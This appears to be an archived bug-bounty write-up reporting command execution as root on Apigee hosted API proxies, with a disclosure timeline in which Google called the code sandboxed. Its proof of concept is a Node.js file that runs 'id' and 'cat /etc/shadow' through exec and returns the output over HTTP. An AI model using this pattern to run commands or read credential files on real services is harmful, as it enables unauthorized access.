---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-12-19_write-up-google-vrp-na-sandboxed-rce-as-root-on-apigee-api-proxies.md
original_filename: 2020-12-19_write-up-google-vrp-na-sandboxed-rce-as-root-on-apigee-api-proxies.md
title: 'Write Up: Google VRP N/A – Sandboxed Rce As Root On Apigee API Proxies'
category: documents
detected_topics:
- ssrf
- xss
- command-injection
tags:
- imported
- documents
- ssrf
- xss
- command-injection
language: en
raw_sha256: dbe608d67cfc2e5a57c49529c6fa6f2f556b4e12280d019d4c485946bc61c1b8
text_sha256: edbdb10e0f00eb96f466a99b4be965ee7cdcd96b845a27936caea1317ac183a4
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: false
---

# Write Up: Google VRP N/A – Sandboxed Rce As Root On Apigee API Proxies

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-12-19_write-up-google-vrp-na-sandboxed-rce-as-root-on-apigee-api-proxies.md
- Source Type: markdown
- Detected Topics: ssrf, xss, command-injection
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: False
- Raw SHA256: `dbe608d67cfc2e5a57c49529c6fa6f2f556b4e12280d019d4c485946bc61c1b8`
- Text SHA256: `edbdb10e0f00eb96f466a99b4be965ee7cdcd96b845a27936caea1317ac183a4`


## Content

---
title: "Write Up: Google VRP N/A – Sandboxed Rce As Root On Apigee API Proxies"
page_title: "GOOGLE VRP N/A – SANDBOXED RCE AS ROOT ON APIGEE API PROXIES – @omespino"
url: "https://omespino.com/write-up-google-vrp-n-a-sandboxed-rce-as-root-on-apigee-api-proxies/"
final_url: "https://omespino.com/write-up-google-vrp-n-a-sandboxed-rce-as-root-on-apigee-api-proxies/"
authors: ["Omar Espino (@omespino)"]
programs: ["Google"]
bugs: ["RCE"]
publication_date: "2020-12-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4059
---

WEBN/A[December 2020](/write-up-google-vrp-n-a-sandboxed-rce-as-root-on-apigee-api-proxies/)

# GOOGLE VRP N/A – SANDBOXED RCE AS ROOT ON APIGEE API PROXIES

**Introduction** Hi everyone It’s been a while since my last post but I’m back, I want to tell you a very short story about one of my last bugs, and how I managed to get an RCE as Root in Apigee (Google acquisition)  

Extracted from Google VRP’s report: (the actual Google VRP report) 

Summary RCE on Apigee API proxies  
  
Steps to reproduce: 

1.- open apigee.com login in with your account 

2.- navigate to Develop > API proxies and click “+Proxy” button 

3.- select hosted target: – put any name (in this case “rce”) – select “Quick start” radio button and the “Next” button – then “Next” again, and “Next” one more time – – check “prod” checkbox and clic “Create and Deploy” Button – after the deploy, copy the url and clic on “Edit proxy”

4.- select “Develop” tab, then clic the “index.js” file in “Resources > hosted” section, and replace the content of that file with and clic on “Save” and “Save” one more time:
  
  
  var http = require('http');
  const { exec } = require('child_process');
  var svr = http.createServer(function(req, resp) {
  resp.setHeader('Content-Type', 'application/json');
  // you can put any linux command in exec function 
  exec(**'echo "- - - - id - - - -";id; echo ;echo "- cat /etc/shadow - ";cat /etc/shadow'** , 
  (error, stdout, stderr) => {
  resp.end(stdout + '\npoc by @omespino');
  }
  );
  });
  svr.listen(process.env.PORT || 3000, function() {});

5.- then visit the url of your proxy and voilà!, profit RCE as root in that Apigee instance

Nov 27, 2020: Sent the report to Google VRP  
Dec 2, 2020: Got a message from google that the bug was triaged (P2)  
Dec 15, 2020: Got a message from google “The executed code is correctly sandboxed.”  
  
Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter [@omespino](https://twitter.com/omespino), read you later.

[](/write-up-google-vrp-n-a-ssrf-bypass-with-quadzero-in-google-cloud-monitoring/)

[](/write-up-google-bug-bounty-xss-to-cloud-shell-instance-takeover-rce-as-root-5000-usd/)
